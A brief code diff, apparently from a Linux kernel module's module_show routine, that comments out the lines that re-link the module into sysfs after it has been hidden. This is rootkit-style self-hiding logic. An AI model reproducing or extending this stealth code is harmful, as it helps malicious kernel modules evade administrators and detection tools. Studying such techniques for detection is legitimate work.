@@ -53,7 +53,7 @@ void module_show(void) {
 
         /* Add to /sys/module/ */
         /* http://elixir.free-electrons.com/linux/latest/source/lib/kobject.c */
-        THIS_MODULE->mkobj.kobj = module_kobj_previous;
+        // THIS_MODULE->mkobj.kobj = module_kobj_previous;
         
         // THIS_MODULE->mkobj.kobj.state_initialized = 0;
         
@@ -64,10 +64,10 @@ void module_show(void) {
         }
 
         // Restore the sysfs directory entry (second approach)
-        struct sysfs_dirent **pos;
-        struct sysfs_dirent *sd = &THIS_MODULE->mkobj.kobj.sd;
-        for (pos = &sd->s_parent->s_dir.children; *pos; pos = &(*pos)->s_sibling);
-            *pos = sd;
+        //struct sysfs_dirent **pos;
+        //struct sysfs_dirent *sd = &THIS_MODULE->mkobj.kobj.sd;
+        //for (pos = &sd->s_parent->s_dir.children; *pos; pos = &(*pos)->s_sibling);
+        //    *pos = sd;
 
         module_hidden = !module_hidden;
 
